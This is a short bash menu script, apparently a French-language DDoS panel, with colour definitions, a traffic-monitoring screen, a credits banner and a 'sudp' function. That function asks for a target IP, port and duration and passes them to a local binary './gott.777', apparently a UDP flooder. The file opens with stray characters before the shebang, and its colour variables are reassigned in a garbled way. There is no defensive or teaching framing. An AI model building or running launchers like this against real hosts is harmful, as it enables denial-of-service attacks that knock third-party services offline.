ew#!/bin/bash
BLACK='\e[0;30m'
CYAN='\e[0;34m'
CYAN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
CYAN='\e[0;35m'
RED='\e[0;33m'
CYAN='\e[0;37m'
CYAN='\e[1;30m'
CYAN='\e[1;34m'
CYAN='\e[1;32m'
BLUE='\e[1;36m'
CYAN='\e[1;31m'
CYAN='\e[1;35m'
CYAN='\e[1;33m'
CYAN='\e[0;37m'
CYAN='\e[1;37m'
PINK='\e[1;35m'
GREEN='\e[1;32m'
NC='\e[0m'              # No Color

dstat1()
{
    clear
    echo -e " ${CYAN}
  ┌───────────────────────────────────────────────────────────────────────┐
  │                        \033[1;91mDSTAT${CYAN}                                          │
  └───────────────────────────────────────────────────────────────────────┘
"
dstat
}

credits(){
clear
echo -e " ${CYAN}
  ┌────────────────────────────────────────────────────────────────────────────┐
  │                         \033[1;91mCREDITS${CYAN}                                            │
  └────────────────────────────────────────────────────────────────────────────┘
  ┌────────────────────────────────────────────────────────────────────────────┐
  │                            Syntaxe#0001: MENU DEV                      │
  │                            \033[1;91mSyntaxe#0001${CYAN}: AIDE                               │
  └────────────────────────────────────────────────────────────────────────────┘
  ┌────────────────────────────────────────────────────────────────────────────┐
  │                         \033[1;91mESC PRODUCTION${CYAN}                                     │
  └────────────────────────────────────────────────────────────────────────────┘
"
}

sudp(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
echo -en "
│ TEMPS : "
read time
./gott.777 ${ip} ${port} 100 1024 50 ${time}
}

